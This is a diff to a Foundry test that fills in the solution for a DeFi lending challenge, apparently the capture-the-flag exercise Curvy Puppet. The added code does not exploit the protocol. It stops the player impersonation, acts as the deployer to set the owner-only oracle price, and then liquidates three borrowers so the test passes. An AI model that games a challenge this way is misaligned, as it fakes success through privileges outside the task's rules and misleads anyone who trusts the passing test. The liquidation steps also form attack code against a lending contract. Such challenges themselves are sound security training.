@@ -40,6 +40,8 @@ contract CurvyPuppetChallenge is Test {
     CurvyPuppetLending lending;
     CurvyPuppetOracle oracle;
 
+    receive() external payable {}
+
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
         _;
@@ -158,7 +160,32 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
+        // Pull only LP needed to liquidate the three 1-LP debt positions.
+        uint256 lpToUse = 3e18;
+        IERC20(curvePool.lp_token()).transferFrom(treasury, player, lpToUse);
+
+        // We are inside checkSolvedByPlayer prank, so switch sender explicitly for owner-only oracle update.
+        vm.stopPrank();
+        vm.startPrank(deployer);
+        oracle.setPrice({asset: ETH, value: 15_000e18, expiration: block.timestamp + 1 days});
+        vm.stopPrank();
+        vm.startPrank(player, player);
+
+        // Prepare LP approvals used by lending.liquidate() pull-based transfer.
+        IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
+        permit2.approve({
+            token: curvePool.lp_token(),
+            spender: address(lending),
+            amount: type(uint160).max,
+            expiration: uint48(block.timestamp + 1 days)
+        });
+
+        lending.liquidate(alice);
+        lending.liquidate(bob);
+        lending.liquidate(charlie);
+
+        dvt.transfer(treasury, dvt.balanceOf(player));
+        IERC20(curvePool.lp_token()).transfer(treasury, IERC20(curvePool.lp_token()).balanceOf(player));
     }
 
     /**
